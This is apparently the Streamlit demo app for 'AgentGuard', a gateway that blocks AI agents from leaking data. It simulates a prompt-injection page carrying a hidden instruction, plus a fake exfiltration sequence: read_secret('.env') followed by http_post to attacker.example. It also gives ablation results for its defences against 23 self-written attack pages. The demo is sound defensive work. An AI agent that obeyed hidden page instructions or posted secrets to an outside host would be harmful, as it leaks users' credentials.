"""AgentGuard live demo. Runs entirely in-process (no gateway server needed), so it deploys on Streamlit Community Cloud.
Local: streamlit run streamlit_app.py"""
import os
import time

os.environ.setdefault("AGENTGUARD_DB", ":memory:")  # never write an audit file in the demo

import pandas as pd
import streamlit as st

from agent.fake_tools import PAGES
from agent.scripted_agent import SCENARIOS, run_scenario
from eval.ablation import run as run_ablation
from gateway.models import ToolCall
from gateway.policy import evaluate, load_policy, scan_output
from gateway.session import Session

st.set_page_config(page_title="AgentGuard demo", page_icon="🛡️", layout="wide")
policy = st.cache_resource(lambda: load_policy("policy.yaml"))()

st.title("🛡️ AgentGuard")
st.write("A gateway that stops AI agents from leaking data. **One call can be harmless; a harmless call after a risky one is how data leaks.** "
         "All data here is fake and nothing leaves your browser session.")
tab1, tab2, tab3 = st.tabs(["Play the agent", "Attack scenarios", "Results table"])

# ---------- Tab 1: interactive ----------
CALLS = {
    "read_db('users')": ("read_db", "users"),
    "read_secret('.env')": ("read_secret", ".env"),
    "fetch_page(news page)": ("fetch_page", "news.example/article"),
    "fetch_page(promo page with hidden instruction)": ("fetch_page", "promo.example/deal"),
    "http_post(attacker.example)": ("http_post", "attacker.example"),
    "http_post(api.company.com)": ("http_post", "api.company.com"),
    "delete_row('users')": ("delete_row", "users"),
}
if "sess" not in st.session_state:
    st.session_state.sess, st.session_state.log = Session(), []


def act(label, tool, arg, guard):
    s, now = st.session_state.sess, time.time()
    if not guard:
        if tool == "read_secret":
            s.taint.add("secret")
        leaked = tool == "http_post" and "secret" in s.taint and arg not in ("api.company.com",)
        msg = "LEAKED: the fake secret was sent out" if leaked else "executed (no guard)"
        st.session_state.log.insert(0, ("error" if leaked or tool == "delete_row" else "success", label, msg))
        return
    d = evaluate(policy, s, ToolCall(session_id="demo", tool=tool, arg=arg), now)
    s.record(tool, arg, d.verdict, now)
    kind, why = {"allow": "success", "block": "error", "approve": "warning"}[d.verdict], f"{d.rule_id}: {d.reason}"
    if d.verdict == "allow" and tool in policy.sensitive_tools:
        s.taint.add("secret")
        why += " (session now tainted: secret)"
    if d.verdict == "allow" and tool == "fetch_page":
        sc = scan_output(policy, PAGES.get(arg, ""))
        if sc.verdict != "allow":
            s.taint.add("untrusted")
            kind, why = "error", f"{sc.rule_id}: hidden instruction found, the agent never sees this page"
    st.session_state.log.insert(0, (kind, label, why))


with tab1:
    guard = st.toggle("AgentGuard on", value=True)
    st.caption("Try: read_secret, then http_post(attacker.example). Then turn the guard off and repeat.")
    cols = st.columns(2)
    for i, (label, (tool, arg)) in enumerate(CALLS.items()):
        if cols[i % 2].button(label, width="stretch"):
            act(label, tool, arg, guard)
    if st.button("Reset session"):
        st.session_state.sess, st.session_state.log = Session(), []
        st.rerun()
    st.write("**Session taint:** " + (", ".join(sorted(st.session_state.sess.taint)) or "clean"))
    for kind, label, why in st.session_state.log:
        getattr(st, kind)(f"`{label}` → {why}")

# ---------- Tab 2: scripted scenarios ----------
with tab2:
    st.write("Naive scripted agents that obey any instruction they read. Each scenario runs with the guard off, then on.")
    if st.button("Run all scenarios"):
        from fastapi.testclient import TestClient
        from gateway.api import app
        gw = TestClient(app)
        rows = [{"Scenario": n, "Guard off": run_scenario(f).harm() or "ok", "Guard on": run_scenario(f, gw).harm() or "ok"}
                for n, f, _ in SCENARIOS]
        st.dataframe(pd.DataFrame(rows), hide_index=True, width="stretch")

# ---------- Tab 3: ablation ----------
with tab3:
    st.write("23 attack pages and 12 normal pages, **written by me**, so this is not an independent benchmark.")
    rows = st.cache_data(run_ablation)()
    df = pd.DataFrame([{"Config": r["config"], "Attacks that caused harm": f"{r['harm']}/23",
                        "Blocked at text layer": r["stopped_by_text"], "Blocked at action layer": r["stopped_by_action"],
                        "Normal pages wrongly blocked": f"{r['benign_blocked']}/12"} for r in rows])
    st.dataframe(df, hide_index=True, width="stretch")
    st.markdown("""**LLM-judge rows** (measured separately with a Gemini key, not recomputed here):

| Config | Harm | Normal pages wrongly blocked |
|---|---|---|
| Regex + LLM-judge + action | 0/23 | 3/12 |
| LLM-judge + action (no regex) | 0/23 | 0/12 |

The judge adds roughly 4 to 12 s per page. Source and limits: see the README.""")
